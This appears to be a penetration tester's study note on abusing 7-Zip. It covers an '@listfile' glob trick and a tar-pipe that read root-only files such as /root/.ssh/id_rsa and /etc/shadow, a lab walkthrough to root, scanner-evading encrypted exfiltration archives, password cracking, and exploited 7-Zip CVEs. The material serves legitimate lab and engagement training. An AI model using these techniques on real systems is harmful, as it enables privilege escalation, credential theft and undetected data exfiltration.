# 7-Zip (7z / p7zip)

**Tags:** `#7zip` `#7z` `#p7zip` `#privesc` `#gtfobins` `#lolbas` `#archive` `#exfil` `#arbitraryfileread` `#motw` `#linux` `#windows`

A cross-platform archiver that looks boring and is anything but on an engagement. Three pentest angles: (1) **privesc** — any privileged process (sudo wrapper, cron, scheduled task, service) that shells out to `7z`/`7z.exe` over a directory *you* can write is an arbitrary-file-read (and sometimes write/exec) primitive as that principal; (2) **offensive archiving** — password-protected, header-encrypted archives for exfil that evade content inspection, plus the Mark-of-the-Web bypass for initial access; (3) **cracking** password-protected archives found in loot. The privesc value is disproportionate to how mundane the tool is.

**Source:** https://www.7-zip.org · **GTFOBins:** https://gtfobins.org/gtfobins/7z/ · **LOLBAS:** `7z.exe`
**Install:** Linux `apt install p7zip-full` (`7z`, `7za`, `7zr`); Windows ships `7z.exe`/`7za.exe` + GUI `7zFM.exe`/`7zG.exe`
**Binaries:** `7z` (full, plugin-based) · `7za` (standalone, common formats) · `7zr` (reduced, `.7z` only) — the abuse below applies to **all three**.

> [!tip] The one-liner privesc story: a filename beginning with `@` is a **listfile**. Feed a root-run `7z` a `@symlink-to-a-secret` and it reads the secret as root and echoes it back in errors — arbitrary file read, no CVE, version-independent.

---

## The core primitive — `@listfile` arbitrary file read (Linux **and** Windows)

7-Zip treats an argument starting with **`@` as a listfile** — "read the list of files to archive from *inside* this file." It is **not** a `-`switch, so it survives a `--` end-of-options terminator on most builds.

The classic setup: a privileged job runs something like `7z a backup.zip *` (or `-- *`) in a directory. The shell glob `*` expands to **every filename in that directory as a separate argument**. You don't hijack the binary — you control the *filenames it feeds to 7z*. Drop a file named `@x` where `x` is a symlink to a root-only file:

```bash
ln -s /root/.ssh/id_rsa id_rsa    # symlink to the target secret
touch @id_rsa                     # a file literally named "@id_rsa"
# when root's 7z globs this dir, it sees the argument @id_rsa → opens id_rsa as a
# listfile → each line is treated as a filename → none exist → 7z prints each line:
#   16.02 (p7zip):  <line of the file> : No more files
#   newer builds :  Cannot find archive: <line of the file>
```

= **arbitrary file read as the privileged user**, leaked line-by-line in the error stream.

### `@listfile` vs the GTFOBins argv reads — pick by what you control

| You control… | Use |
|---|---|
| **only filenames** in a dir a fixed privileged `7z a … *` globs | the **`@listfile`** trick above |
| the **whole command line** (`sudo 7z …`, SUID `7z`) | the GTFOBins pipe (see below) |

This distinction matters — the GTFOBins entries need you to choose the args *and* the path, so they do **not** apply when the command is fixed and you only get to plant files.

### ⚠️ Two subtleties that decide success (learned the hard way on a real box)

1. **Top-level placement.** The `@file` must be a **direct argument the glob emits** — i.e. at the *top level* of the directory the glob runs in. A `@file` sitting in a **subdirectory** is reached only by 7z's *recursion into the matched directory* and gets archived as ordinary content — it is **never parsed as a `@`-argument**, so nothing leaks. (Symptom of the wrong placement: the archive's file count just goes up by the number of files you planted, clean output, no error lines.)
2. **`--` and version drift.** `--` ends switch parsing, and on **some newer 7z (observed 26.x)** it *also* demotes `@x` to a literal filename → archived, no leak. **Older 7z (16.02)** still treats a top-level `@x` as a listfile *even with `--` present*. Likewise `-snl` (store symlinks as links) means archiving a symlink stores a dangling link, **not** its target's bytes — so the leak must come from the `@listfile` echo, not from reading the resulting archive. If unsure what the wrapper really runs, confirm the assembled call on a copy: `cp /usr/bin/wrapper /tmp/w; ltrace -f -s400 /tmp/w` (`strings` can misreport the `system()` line).

### Worked example — root SSH-key read (HTB *Usage*)

A `NOPASSWD` sudo binary ran, as root, `/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *` in `/var/www/html` (writable by the foothold user):

```bash
cd /var/www/html                       # the dir the '*' globs — TOP LEVEL, not a subdir
ln -s /root/.ssh/id_rsa id_rsa
touch @id_rsa
sudo /usr/bin/usage_management         # choose option 1 (Project Backup)
# → root's ed25519 key leaks line-by-line in "<line> : No more files" errors
# reassemble the lines → chmod 600 key → ssh -i key root@target   => ROOT
```

Reads only (nothing written to a root path) → **clean and repeatable**.

---

## GTFOBins — sudo / SUID with full argv control

When you *do* control the command line (`sudo 7z …`, or a SUID `7z`), the canonical read (verbatim from GTFOBins) tars the file to stdout and pipes it back out:

```bash
LFILE=/etc/shadow
7z a -ttar -an -so "$LFILE" | 7z e -ttar -si -so
```

`a -ttar -an -so` = add to a tar stream, no archive name, write to stdout; `e -ttar -si -so` = extract that tar from stdin to stdout. Net effect: 7z `cat`s a file it otherwise had no business reading, as root.

---

## Linux privesc — where you meet it

- **`sudo -l`** shows `7z`/`7za`/`7zr` (or a custom wrapper that calls one) → GTFOBins it, or plant a `@listfile` if the command/glob is fixed.
- **Wildcard in a root cron/script**: `7z a /backup/b.zip *` in a writable dir → `@listfile` read. (Same family as the `tar --checkpoint` / `rsync -e` wildcard tricks in [[Class notes/HTB Academy/CPTS v2 (claude)/Linux Priv Esc|Linux Priv Esc]].)
- **Rule of thumb**: a root program that shells out to a standard tool is *not* the bug — look up **that tool's** abuse. Custom `usage_management`-style wrappers are the giveaway.

---

## Windows abuse (7-Zip is huge on Windows too)

### `@listfile` read via a privileged 7z call

The `@listfile` primitive is **7z behaviour, not OS-specific** — it works identically for `7z.exe`. If an **admin/SYSTEM scheduled task or service** runs `7z.exe a backup.zip C:\some\writable\dir\*`, plant `@secret` there to read a privileged file.

> [!warning] **Windows symlink caveat.** Creating a *symbolic* link needs `SeCreateSymbolicLinkPrivilege` (admins by default, or any user with **Developer Mode** on) — a low-priv user usually can't `mklink`. Workarounds: an NTFS **hardlink** (`mklink /H link target`, files only, same volume, no special privilege) to the target; point the listfile at an already-readable-but-sensitive path; or prefer a CVE path below.

### CVE-2025-11001 — crafted-symlink ZIP → arbitrary **write** as Administrator (7-Zip < 25.00)

A specially crafted ZIP containing a **symlink entry** defeats 7-Zip's path containment (directory traversal). When such an archive is **extracted by an Administrator / a service running as SYSTEM**, an attacker can write files **outside** the extraction directory → drop into a **Startup** folder, overwrite a **service binary**, or plant a hijackable **DLL** → code execution as that principal. Actively exploited (public PoC; NHS alert). Paired with CVE-2025-11002. **Fixed in 7-Zip 25.00 (Jul 2025).**

- Pentest framing: any workflow where a **privileged** context auto-extracts an attacker-supplied ZIP (upload handlers, mail gateways, backup/restore jobs) — combine with [[Class notes/HTB Academy/CPTS v2 (claude)/File Upload Attacks|File Upload Attacks]] (an archive-extracting upload point).

### CVE-2025-0411 — Mark-of-the-Web bypass, **double-archive** (7-Zip < 24.09)

When 7-Zip extracts a **nested** archive that carries MotW, it fails to propagate the Mark-of-the-Web to the inner extracted files → your dropped `.exe`/`.lnk`/`.js` runs **without** the SmartScreen "downloaded file" warning. Technique = **archive your payload twice** and deliver the outer archive. CISA KEV; used in the wild by SmokeLoader / spear-phishing (with homoglyph extension spoofing). **Fixed 24.09 (Nov 2024).** An **initial-access / phishing** primitive, not a local privesc.

### CVE-2022-29072 — 7-Zip ≤ 21.07 GUI command execution

Dragging a `.7z` file onto the **Help > Contents** pane of the 7-Zip File Manager (`7zFM.exe`) spawns a child `cmd.exe` under 7zFM's token (misconfigured `7z.dll` + a heap overflow via `hh.exe`). Command execution is real; the *privilege-escalation* claim is **disputed** (only elevates if 7zFM was already running elevated). GUI-only, version-specific — a footnote next to the two 2025 bugs, but know it exists.

---

## Argument injection (leading-dash filenames)

Beyond `@`, 7z parses any globbed filename that **starts with `-`** as a **switch**. In a `7z a archive *` over a writable dir, a file named e.g. `-t7z`, `-p<pw>`, `-mhe=on`, or `-w<path>` is consumed as an option rather than data — it can change output format, working dir, or encryption. Less commonly weaponisable than `@`, but the same "shell glob feeds attacker filenames as argv" root cause — worth trying when `@` is neutralised.

---

## Offensive archiving — encrypted exfil / evasion

```bash
# AES-256 + ENCRYPTED HEADERS (-mhe=on hides the filenames too) — beats content scanners
7z a -p'S3cr3t!' -mhe=on loot.7z /path/to/data

# split into fixed-size volumes for a size-limited channel (loot.7z.001, .002, …)
7z a -v25m loot.7z bigdir

# list / test / extract without writing (integrity check)
7z l loot.7z ; 7z t loot.7z
```

> [!note] A password-protected 7z/zip is a favourite for slipping tooling past AV that can't inspect the contents — but the *archive object* itself is still on disk and its metadata (sans `-mhe`) is readable. Pair with a real transfer note ([[Tools/File Transfer/SMBserver|SMBserver]] / [[Tools/File Transfer/SCP|SCP]]).

---

## Cracking password-protected archives (loot)

```bash
# extract a hashcat/john-compatible hash from the archive header
7z2john loot.7z > 7z.hash            # perl helper shipped with John (a.k.a. 7z2hashcat)

hashcat -m 11600 7z.hash rockyou.txt # 11600 = 7-Zip
john --wordlist=rockyou.txt 7z.hash
```

Header-encrypted (`-mhe=on`) archives hide filenames but are still crackable — the KDF is the same. (`-mhe` just denies you the "what's inside" preview until you crack it.)

---

## Detection / OPSEC

- The **`@listfile` read** writes nothing to a privileged path → clean, leaves only the leaked lines in *your* terminal, and is repeatable. Cheapest privesc footprint available.
- **Extract-as-admin CVEs** leave dropped artifacts (Startup/service/DLL files) + Windows event logs; the extracted payload is the IOC.
- Version tells you which door is open: `7z --help` / the GUI About box on Windows, `7z` banner on Linux (`p7zip 16.02` etc.). Check before firing a CVE — blind attempts are noisy.

---

> [!note] **See also** — the sudo/SUID/wildcard context lives in [[Class notes/HTB Academy/CPTS v2 (claude)/Linux Priv Esc|Linux Priv Esc]]; the scheduled-task / auto-extract context in [[Class notes/HTB Academy/CPTS v2 (claude)/Windows Priv Esc|Windows Priv Esc]]. Archive-extracting **upload** points chain with [[Class notes/HTB Academy/CPTS v2 (claude)/File Upload Attacks|File Upload Attacks]] (Zip Slip / CVE-2025-11001). GTFOBins gives the primitive; the target's constraints decide which entry is reachable (full argv → the tar-pipe; filenames-only → `@listfile`).

---

*Created: 2026-09-01*
*Updated: 2026-09-01*
*Model: claude-opus-5*
